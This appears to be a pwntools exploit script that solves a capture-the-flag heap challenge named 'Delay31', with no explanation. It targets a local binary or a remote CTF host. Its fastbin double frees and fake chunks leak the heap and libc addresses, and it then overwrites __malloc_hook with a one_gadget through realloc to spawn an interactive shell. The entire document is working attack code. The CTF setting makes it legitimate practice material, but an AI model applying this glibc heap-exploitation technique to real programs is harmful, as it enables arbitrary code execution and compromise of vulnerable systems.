#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = './Delay31'

context.os='linux'
context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc.so.6')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('chuj.top', '53178')


def debug():
    gdb.attach(p)
    pause()

bps = []
pie = 1
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)


def eat():
    p.recvuntil('choice :')

def add(size, con):
    eat()
    p.sendline('1')
    p.recvuntil('size:\n')
    p.sendline(str(size))
    p.recvuntil('content:\n')
    p.send(con)

def show(idx):
    eat()
    p.sendline('2')
    p.recvuntil('id:\n')
    p.sendline(str(idx))

def dele(idx):
    eat()
    p.sendline('3')
    p.recvuntil('id:\n')
    p.sendline(str(idx))

# add(0x58, b'b'*0x58)#* 0
add(0x58, b'b'*0x10 +p64(0)+p64(0x61)+b'\n')#* 0

add(0x58, b'b\n')#* 1
add(0x28, b'\n')#* 2

add(0x28, b'\n')#* 3


dele(0)
dele(1)

show(1)
heapbase = u64(p.recv(6).ljust(8, b"\x00"))-0x120
log.success("heapbase: "+hex(heapbase))
fake_chunk_addr = heapbase + 0x140

dele(0)

add(0x58, p64(fake_chunk_addr)+b'\n')#* 4

add(0x58, b'\n')#* 5
add(0x58, b'\n')#* 6

add(0x58, + 0x30*b'b'+p64(0)+p64(0x91)+b'\n')#* 7



dele(1)

show(1)
libc.address = u64(p.recv(6).ljust(8,b'\x00'))-0x3c4b78
log.success("libc.address: "+hex(libc.address))
malloc_hook = libc.symbols["__malloc_hook"]
log.success("malloc_hook: "+hex(malloc_hook))
malloc_hook_s23h = malloc_hook-0x23
log.success("malloc_hook_s23h: "+hex(malloc_hook_s23h))



add(0x58, b'\n')#* 8
add(0x28, b'\n')#* 9


p.recvuntil("clear done!\n")
p.sendline('1')
p.recvuntil('size:\n')
p.sendline(str(0x48))#* 0
p.recvuntil('content:\n')
p.send(b'\n')

add(0x48, b'\n')#* 1
add(0x38, b'\n')#* 2
add(0x38, b'\n')#* 3
dele(0)
dele(1)
dele(0)

fake_chunk_addr = libc.address+0x3c4b30
add(0x48, p64(fake_chunk_addr)+b'\n')#* 4
add(0x48, b'\n')#* 5
add(0x48, b'\n')#* 6

dele(2)
dele(3)
dele(2)
add(0x38, p64(0x51)+b'\n')#* 7
add(0x38, b'\n')#* 8
add(0x38, b'\n')#* 9

p.recvuntil("clear done!\n")
p.sendline('1')
p.recvuntil('size:\n')
p.sendline(str(0x48))#* 0
p.recvuntil('content:\n')
p.send(0x38*b'\x00'+p64(malloc_hook-0x18)+b'\n')

one_array = [0x45216,0x4526a,0xf02a4,0xf1147]
one_gadgets = libc.address + one_array[1]
realloc_addr = libc.symbols["realloc"]
log.success("realloc_addr: "+hex(realloc_addr))

payload = p64(one_gadgets) + p64(realloc_addr+0xc)
add(0x28, payload+b'\n')

p.sendline('1')
p.recvuntil('size:\n')
p.sendline(str(0x28))


p.interactive()
